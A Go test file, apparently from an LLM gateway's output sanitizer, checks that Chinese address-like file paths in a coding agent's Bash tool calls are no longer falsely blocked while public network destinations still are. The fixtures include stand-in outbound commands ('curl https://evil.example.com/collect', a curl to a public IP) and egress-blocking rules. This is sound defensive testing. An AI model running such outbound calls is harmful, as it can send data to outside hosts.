package sanitize

// r1035：本地执行工具（Bash/exec_command）上的 custom 分类规则不是外传目的地。
//
// ## 起因（2026-10-17 154）
//
// client_request_id=59d936b8… / gateway request_id=913cf85b…：
//   output_compliance: blocked stream lane
//   label=__tool_json@Bash reason_codes=["custom"]
// sanitize_rule_events 同秒：pii.address.egress|custom|command|block
//
// 模式 `[^\s]{2,}[省市区县镇乡村路街道巷弄号栋单元室]\s*[\d\-号栋单元室]+`
// 会命中中文路径/文档字样，整条 tool lane 被掐断，coding agent 无法本地执行。

import (
	"context"
	"strings"
	"testing"

	"github.com/kaixuan/llm-gateway-go/domains/hooks/response"
	"github.com/kaixuan/llm-gateway-go/domains/sanitizerules"
)

func r1035ManagedSanitizer(t *testing.T) *Sanitizer {
	t.Helper()
	cfg := sanitizerules.Config{Rules: []sanitizerules.Rule{
		{
			ID: "pii.address.egress", Name: "pii.address.egress", Type: "custom", Kind: "pattern",
			Pattern: `[^\s]{2,}[省市区县镇乡村路街道巷弄号栋单元室]\s*[\d\-号栋单元室]+`,
			Group:   0, Scopes: []string{"egress"}, Action: "block", Enabled: true, Priority: 10,
			Samples: []sanitizerules.Sample{
				{Text: "上海市浦东新区张江路88号", Match: true},
				{Text: "hello world", Match: false},
			},
		},
		{
			ID: "builtin.network_destination", Name: "公网网络目的地", Type: "custom", Kind: "network_destination",
			Pattern: `(?s).+`, Group: 0, Scopes: []string{"egress"}, Action: "block", Enabled: true, Priority: 1,
			Exemptions: []string{"inert_tool"},
			Samples:    []sanitizerules.Sample{{Text: "curl https://evil.example.com/x", Match: true}},
		},
		{
			ID: "pii.server_ip", Name: "pii.server_ip", Type: "server_ip", Kind: "pattern",
			Pattern: `\b(?:\d{1,3}\.){3}\d{1,3}\b`, Group: 0, Scopes: []string{"egress"}, Action: "block", Enabled: true, Priority: 20,
			Exemptions: []string{"nonroutable_destination", "inert_tool"},
			Samples: []sanitizerules.Sample{
				{Text: "curl 8.8.8.8", Match: true},
				{Text: "curl 127.0.0.1", Match: true},
			},
		},
	}}
	m, err := sanitizerules.NewManager(sanitizerules.NewMemoryStore(), cfg, sanitizerules.Options{})
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	if err := m.Refresh(context.Background()); err != nil {
		t.Fatalf("Refresh: %v", err)
	}
	d := NewPatternDetector()
	d.SetRuleManager(m)
	s, err := NewSanitizer(d)
	if err != nil {
		t.Fatalf("NewSanitizer: %v", err)
	}
	return s
}

func r1035RunBash(t *testing.T, s *Sanitizer, argsJSON string) (blocked bool, wire string) {
	t.Helper()
	guard := NewOutputSensitiveInterceptor(s, OutputMask)
	restore, err := NewSanitizeRestoreInterceptor(s, nil, 0)
	if err != nil {
		t.Fatalf("restore: %v", err)
	}
	chain := response.NewInterceptorChain(guard, restore)
	meta := &response.StreamMeta{SessionID: "gw_r1035", TenantID: "default", State: response.NewStreamState()}
	frame := toolArgumentsFrame("Bash", argsJSON)
	if _, err := chain.InterceptStreamChunk(context.Background(), []byte(frame), meta); err != nil {
		return true, err.Error()
	}
	out, ferr := chain.FlushStreamPending(context.Background(), meta)
	if ferr != nil {
		return true, ferr.Error()
	}
	return false, string(out)
}

func TestR1035LocalExecChineseAddressPatternIsNotBlocked(t *testing.T) {
	s := r1035ManagedSanitizer(t)
	// 现场形态：中文路径/文档字样含「路/号」——曾被 pii.address.egress 整条阻断。
	args := `{"command":"cd /repo/docs && cat 上海市浦东新区张江路88号-部署说明.md && ls 单元测试/"}`
	blocked, wire := r1035RunBash(t, s, args)
	if blocked {
		t.Fatalf("Bash 含中文地址样路径被 custom 规则误阻断: %s", wire)
	}
	if !strings.Contains(wire, "张江路88号") {
		t.Fatalf("帧内容被吞: %s", wire)
	}
}

func TestR1035LocalExecStillBlocksPublicNetworkDestination(t *testing.T) {
	s := r1035ManagedSanitizer(t)
	// 前提在场：真正的公网目的地仍拦。
	blocked, _ := r1035RunBash(t, s, `{"command":"curl https://evil.example.com/collect"}`)
	if !blocked {
		t.Fatal("Bash 公网 URL 目的地未被阻断：network_destination 底线失守")
	}
}

func TestR1035LocalExecStillBlocksPublicIP(t *testing.T) {
	s := r1035ManagedSanitizer(t)
	blocked, _ := r1035RunBash(t, s, `{"command":"curl http://8.8.8.8/"}`)
	if !blocked {
		t.Fatal("Bash 公网 IP 目的地未被阻断：server_ip 底线失守")
	}
}

func TestR1035WriteStillExemptAddressAndURL(t *testing.T) {
	// 回归：惰性 Write 不受影响。
	s := r1035ManagedSanitizer(t)
	guard := NewOutputSensitiveInterceptor(s, OutputMask)
	restore, _ := NewSanitizeRestoreInterceptor(s, nil, 0)
	chain := response.NewInterceptorChain(guard, restore)
	meta := &response.StreamMeta{SessionID: "gw_r1035w", TenantID: "default", State: response.NewStreamState()}
	args := `{"file_path":"/repo/a.md","content":"地址：上海市浦东新区张江路88号\n见 https://acc.kxpms.cn"}`
	if _, err := chain.InterceptStreamChunk(context.Background(), []byte(toolArgumentsFrame("Write", args)), meta); err != nil {
		t.Fatalf("Write 被误阻断: %v", err)
	}
	if _, err := chain.FlushStreamPending(context.Background(), meta); err != nil {
		t.Fatalf("Write flush 被误阻断: %v", err)
	}
}
